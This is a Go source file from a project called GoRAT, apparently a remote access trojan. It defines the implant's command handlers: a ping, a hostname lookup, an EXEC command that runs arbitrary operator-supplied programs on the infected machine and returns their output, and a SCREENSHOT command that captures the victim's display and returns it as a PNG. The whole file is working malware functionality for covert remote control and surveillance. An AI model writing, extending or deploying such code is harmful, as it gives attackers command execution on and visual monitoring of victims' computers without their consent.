// Copyright (c) 2020 Elitis. All rights reserved.
// This file is part of GoRAT; see LICENSE for your rights.

package commands

import (
	"bytes"
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

var commands = []*command{
	&command{
		Identifier: "PING",
		Function: func(message []byte) []byte {
			return []byte(time.Now().String())
		},
	},
	&command{
		Identifier: "HOSTNAME",
		Function: func(message []byte) []byte {
			// Get the OS hostname
			hostname, err := os.Hostname()
			if err != nil {
				return []byte(err.Error())
			}

			return []byte(hostname)
		},
	},
	&command{
		Identifier: "EXEC",
		Function: func(message []byte) []byte {
			splitted := strings.Split(string(message), " ")
			cmdName := splitted[1]
			args := splitted[2:]

			// Run the cmd, unwrapping the args array
			out, err := exec.Command(cmdName, args...).Output()
			if err != nil {
				return []byte(err.Error())
			}

			return out
		},
	},
	&command{
		Identifier: "SCREENSHOT",
		Function: func(message []byte) []byte {
			n := screenshot.NumActiveDisplays()
			slice := strings.Split(string(message), " ")
			display := 0
			if len(slice) >= 2 {
				display, err := strconv.Atoi(slice[1])
				chk(err)

				if display > n-1 {
					display = 0
				}
			}
			display = 0

			bounds := screenshot.GetDisplayBounds(display)

			img, err := screenshot.CaptureRect(bounds)
			chk(err)

			var buf bytes.Buffer
			png.Encode(&buf, img)

			fileName := fmt.Sprintf("%d_%s.png", display, strings.ReplaceAll(time.Now().String(), " ", "_"))
			return []byte(fileName + " " + string(buf.Bytes())) // TODO: make more efficient
		},
	},
}
